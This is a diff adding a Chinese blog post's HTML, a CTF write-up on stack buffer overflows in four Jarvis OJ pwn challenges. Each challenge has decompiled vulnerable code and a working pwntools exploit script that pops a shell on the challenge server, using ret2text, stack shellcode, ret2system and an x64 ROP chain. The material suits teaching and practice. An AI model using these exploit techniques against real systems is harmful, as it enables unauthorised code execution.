@@ -1,0 +1,242 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>栈溢出总结 - hackpwn</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="hackpwn,"> 
+    <meta name="description" content="本文将会持续更新Jarvisoj-Level0
+ 发现开启了nx保护 
+
+
+可以看到程序为64位的ELF文件，使用IDA进行分析。
+
+发现vulnerable函数，跟进。
+123456ssize_t,"> 
+    <meta name="author" content="dh、Catsay"> 
+    <link rel="alternative" href="atom.xml" title="hackpwn" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">hackpwn</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" target="_blank" rel="noopener" data-url="http://hackpwn.xyz"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">栈溢出总结</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" target="_blank" rel="noopener" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;" target="_blank" rel="noopener"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">栈溢出总结</h1>
+        <div class="stuff">
+            <span>十一月 14, 2019</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF-Pwn/" rel="tag">CTF,Pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="本文将会持续更新"><a href="#本文将会持续更新" class="headerlink" title="本文将会持续更新"></a>本文将会持续更新</h3><h3 id="Jarvisoj-Level0"><a href="#Jarvisoj-Level0" class="headerlink" title="Jarvisoj-Level0"></a>Jarvisoj-Level0</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114124203683.png" alt="image-20191114124203683"></p>
+<p> 发现开启了nx保护 </p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114123920365.png" alt="image-20191114123920365"></p>
+<ul>
+<li><p>可以看到程序为64位的ELF文件，使用IDA进行分析。</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114124043024.png" alt="image-20191114124043024"></p>
+<p>发现<code>vulnerable</code>函数，跟进。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序开辟了<code>0x80</code>大小的栈空间。但是<code>read</code>了<code>0x200</code>字节，造成栈溢出</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114124335506.png" alt="image-20191114124335506"></p>
+<p>同时在函数里发现了<code>callsystem</code>的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目思路很清晰，也就是我们需要把<code>vulnerable_function</code>函数的返回地址覆盖为<code>callsystem</code>函数的地址。</p>
+<p>我们就可以构造出payload：<code>&#39;a&#39;*0x80+junk_ebp+p64(sys_addr)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line">e = ELF(<span class="string">"level0.b9ded3801d6dd36a97468e128b81a65d"</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">'callsystem'</span>]</span><br><span class="line">junk_ebp = <span class="string">'a'</span>*<span class="number">8</span><span class="comment">#ebp在64位下8位</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + junk_ebp + p64(sys_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()<span class="comment">#反弹shell进行交互</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114125053896.png" alt="image-20191114125053896"></p>
+</li>
+</ul>
+<h3 id="Jarvisoj-Level1"><a href="#Jarvisoj-Level1" class="headerlink" title="Jarvisoj-Level1"></a>Jarvisoj-Level1</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114125221603.png" alt="image-20191114125221603"></p>
+<p>没有开启任何的保护</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114125306156.png" alt="image-20191114125306156"></p>
+<p>发现是32位的程序。</p>
+<p>进入程序，发现了<code>vulnerable_function</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序会打印出<code>buf</code>的地址，栈的大小为<code>0x88</code>但是<code>read</code>函数缺读了<code>0x100</code>的大小，可以通过栈溢出让函数跳转到<code>shellcode</code>的位置去执行。</p>
+<p>Pwntools构造shellcode：<code>shellcode=asm(shellcraft.sh())</code>。</p>
+<p>我们可以直接在缓冲区里面构造一个shellcode，并使用<code>buf</code>作为起始地址。</p>
+<p>首先我们先要获取到这个地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">text = r.recvline()</span><br><span class="line"><span class="keyword">print</span>  text</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">catsay@Catsay-PC:/mnt/d/CTF/Study/Pwn/Jarvisoj/level1$ python exp.py</span><br><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">What's this:0xfff242c0?</span><br><span class="line"></span><br><span class="line">[*] Closed connection to pwn2.jarvisoj.com port 9877</span><br></pre></td></tr></table></figure>
+
+<p>我们需要获取到<code>fff242c0</code></p>
+<p><code>r.recvuntil(&quot;What&#39;s this:&quot;)</code>表示从接收到“what’s this：”开始 </p>
+<p><code>buf_addr = int(target.recv(10),16)</code>将获取到的十个字符串转换为16进制的整数</p>
+<p>那么可以构造出exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">text = r.recvline()[<span class="number">14</span>: <span class="number">-2</span>]</span><br><span class="line">buf_addr = int(text, <span class="number">16</span>)</span><br><span class="line"><span class="comment">#shellcode放入buf后，buf并未填满，需要继续覆盖到ebp，所以继续向后填充后再返回buf进行执行</span></span><br><span class="line">payload = shellcode +<span class="string">"A"</span> *(<span class="number">0x88</span>+<span class="number">0x4</span>-len(shellcode)) + p32(buf_addr) </span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114130556760.png" alt="image-20191114130556760"></p>
+<h3 id="Jarvisoj-Level2"><a href="#Jarvisoj-Level2" class="headerlink" title="Jarvisoj-Level2"></a>Jarvisoj-Level2</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114130809712.png" alt="image-20191114130809712"></p>
+<p>开启了NX保护</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114130835189.png" alt="image-20191114130835189"></p>
+<p>32为的程序</p>
+<p>进入<code>vulnerable_function</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131021031.png" alt="image-20191114131021031"></p>
+<p>查看字符串发现了<code>/bin/sh</code>的地址。并且存在<code>system</code>函数，那么的话我们可以直接跳过去执行。获取<code>shell</code>。</p>
+<p><code>payload = junk + fackebp + func + junk + 参数</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">system_add = p32(<span class="number">0x08048320</span>)</span><br><span class="line">binsh_add = p32(<span class="number">0x0804A024</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span> + <span class="number">0x4</span>) + system_add +<span class="string">'a'</span>*<span class="number">4</span> + binsh_add</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>system()</code>函数需要先传一个地址，这里我们直接随意传，然后跟上<code>/bin/sh</code></p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131420145.png" alt="image-20191114131420145"></p>
+<h3 id="Jarvisoj-Level2-x64"><a href="#Jarvisoj-Level2-x64" class="headerlink" title="Jarvisoj-Level2_x64"></a>Jarvisoj-Level2_x64</h3><p>很明显题目是64位的。</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131620663.png" alt="image-20191114131620663"></p>
+<p>题目依然只是开启了NX保护。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>vulnerable_function</code>同样也是一样的。</p>
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131739301.png" alt="image-20191114131739301"></p>
+<p>也就是说就是题目没有变，只是换成了64位。</p>
+<p>首先 read() 函数存在缓冲区溢出漏洞。 64位程序 , 函数调用时参数并不是像 32位程序那样全部存放在栈中，而是：</p>
+<p>如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 : <code>rdi, rsi, rdx, rcx, r8, r9</code></p>
+<p>如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈，我们这里需要构造 <code>system(&quot;/bin/sh&quot;)</code>的调用栈，因此需要使用到寄存器传参 , 根据<code>rop</code>的思想 :需要首先在可执行程序(或者该程序的动态连接库)中寻找 <code>pop rdi; ret</code> 这两条汇编指令的机器码<code>ROPgadget --binary level2_x64.04d700633c6dc26afc6a1e7e9df8c94e  --only &#39;pop|ret&#39; | grep &#39;rdi&#39;</code></p>
+<p><code>0x00000000004006b3 : pop rdi ; ret</code></p>
+<p>然后就可以构造 payload：</p>
+<p><code>payload =  junk + fake + pop_rdi_ret_address + bin_sh_address + system_address</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9882</span>)</span><br><span class="line">pop_rdi_ret_address = p64(<span class="number">0x4006b3</span>)</span><br><span class="line">bin_sh_address = p64(<span class="number">0x600A90</span>)</span><br><span class="line">system_address = p64(<span class="number">0x4004C0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x80</span> + <span class="string">"B"</span> * <span class="number">0x8</span> + pop_rdi_ret_address + bin_sh_address + system_address</span><br><span class="line">p.write(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114132704913.png" alt="image-20191114132704913"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/1363948882.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
